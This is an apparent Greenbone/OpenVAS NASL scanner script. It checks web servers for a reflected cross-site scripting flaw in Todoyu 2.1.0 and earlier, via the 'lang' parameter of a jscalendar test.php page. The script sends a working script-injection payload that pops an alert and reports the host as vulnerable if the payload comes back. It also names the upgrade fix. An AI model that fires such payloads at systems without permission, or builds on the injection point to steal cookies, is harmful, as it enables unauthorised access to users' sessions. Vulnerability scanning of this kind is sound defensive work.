if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902416" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-05-02 12:20:04 +0200 (Mon, 02 May 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Todayu Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/100695/Todoyu2.0.8-xss.txt" );
	script_xref( name: "URL", value: "http://www.securityhome.eu/exploits/exploit.php?eid=14706246374db10bfe6f4f71.12853295" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation could allow execution of scripts or
actions written by an attacker. In addition, an attacker may obtain authorization
cookies that would allow him to gain unauthorized access to the application." );
	script_tag( name: "affected", value: "Todayu version 2.1.0 and prior" );
	script_tag( name: "insight", value: "The flaw is due to failure in the 'lib/js/jscalendar/php/test.php?'
script to properly sanitize user supplied input in 'lang' parameter." );
	script_tag( name: "solution", value: "Upgrade to version 2.1.1 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "This host is running Todayu and is prone to cross site scripting
vulnerabilities." );
	script_xref( name: "URL", value: "http://www.todoyu.com/community/download" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/todayu", "/Todoyu", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: NASLString( dir, "/index.php" ), port: port );
	if(ContainsString( res, "<title>Login - todoyu</title>" )){
		req = http_get( item: NASLString( dir, "/lib/js/jscalendar/php/test.php?lang=\"" + "></script><script>alert(\"XSS-TEST\")</script>" ), port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<script>alert(\"XSS-TEST\")</script>" )){
			security_message( port );
			exit( 0 );
		}
	}
}

